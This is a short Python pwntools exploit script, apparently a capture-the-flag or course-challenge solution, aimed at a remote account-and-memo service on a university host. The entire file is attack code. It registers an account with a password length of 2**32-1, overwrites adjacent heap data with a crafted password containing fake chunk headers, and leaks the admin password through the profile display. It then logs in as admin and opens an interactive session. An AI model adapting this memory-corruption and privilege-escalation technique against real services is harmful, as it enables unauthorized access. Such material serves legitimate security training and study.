from pwn import *

port = 10036
rem = remote("kayle.snu.ac.kr", port)

def create_account(username, pw_len, pw, memo):
    rem.sendlineafter(b"> ", b"1")
    rem.sendlineafter(b"username: ", username)
    rem.sendlineafter(b"password?", str(pw_len).encode())
    rem.sendafter(b"password: ", pw), sleep(0.1)
    rem.sendlineafter(b"memo: ", memo)

def login(username, pw):
    rem.sendlineafter(b"> ", b"2")
    rem.sendlineafter(b"username: ", username)
    rem.sendafter(b"password:", pw), sleep(0.1)

def change_pw(pw):
    rem.sendlineafter(b"> ", b"3")
    rem.sendafter(b"password:", pw)

def show_profile():
    rem.sendlineafter(b"> ", b"4")

def logout():
    rem.sendlineafter(b"> ", b"5")

def admin():
    rem.sendlineafter(b"> ", b"-1")

create_account(b"AAAA", 2**32-1, b"AAAA", b"MMMM")
create_account(b"BBBB", 16, b"BBBB", b"MMMM")

login(b"AAAA", b"AAAA")
change_pw(b"C" * 0x10 + b'\x31' + b'\x00' * 7 + b"C" * 0x28 + b'\x31' + b'\x00' * 7 + b'\x00')
logout()

login(b'BBBB', b'BBBB')
show_profile()
rem.recvuntil(b'Memo: ')
rem.recvn(8)
pw = rem.recvn(16)

logout()
login(b"admin", pw)
admin()

rem.interactive()
